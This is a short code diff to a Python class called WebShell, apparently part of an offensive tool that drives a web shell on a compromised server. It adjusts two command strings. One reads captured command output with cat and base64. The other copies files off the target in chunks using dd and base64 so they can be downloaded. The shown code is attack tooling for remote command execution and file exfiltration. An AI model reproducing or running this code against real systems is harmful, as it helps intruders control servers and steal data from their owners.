@@ -52,7 +52,7 @@ class WebShell(object):
 
     # Read $session, output text to screen & wipe session
     def ReadThread(self):
-        GetOutput = f"/bin/cat {self.stdout} | python -m base64 | tr -d '\\n'"
+        GetOutput = f"/bin/cat {self.stdout} | python -m base64"
         while True:
             result = self.RunRawCmd(GetOutput) #, proxy=None)
             if result:
@@ -167,7 +167,7 @@ while True:
             i = 0
             fd = open(dst, 'wb', buffering=0)
             while True:
-                datab64 = exec_com(f"dd skip={i*1024} count=1024 if={src} bs=1 status=none | python -m base64 | tr -d '\\n'")
+                datab64 = exec_com(f"dd skip={i*1024} count=1024 if={src} bs=1 status=none | python -m base64")
                 if not datab64:
                     break
                 data = base64.b64decode(datab64)
